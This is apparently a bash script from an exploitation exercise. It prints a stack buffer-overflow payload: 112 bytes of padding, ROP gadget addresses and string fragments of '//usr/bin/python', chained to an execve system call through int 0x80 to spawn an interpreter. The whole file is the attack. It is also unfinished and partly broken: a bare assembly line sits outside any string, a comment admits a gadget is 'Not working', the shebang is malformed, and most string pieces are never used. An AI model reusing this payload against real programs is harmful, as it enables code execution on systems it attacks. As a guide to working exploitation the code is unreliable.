#!bin/bash

buffer=$(printf '\x41%.0s' {1..112}) #fill the buffer

gadget1="\x5b\xe8\x06\x08"      #0x0806e85b
py1="\x73\x75\x2f\x2f"          #//us
py2="\x69\x62\x2f\x72"          #r/bi
py3="\x79\x70\x2f\x6e"          #n/py
py4="\x6e\x6f\x68\x74"          #thon



#set edx to 0 Not working
0x0807ccb8: dec edx; ret;



#set eax to 11
g_eax0="\xd0\x5e\x05\x08"
g_eax11=$(printf '\xea%.0s\xbc%.0s\x07%.0s\x08%.0s' {1..44})

#set ecx to 0 and call interupt
g_ecx0_int80="\x21\xec\x06\x08"

echo -en "$buffer$gadget1$py1$g_eax0$g_eax11$g_ecx0_int80"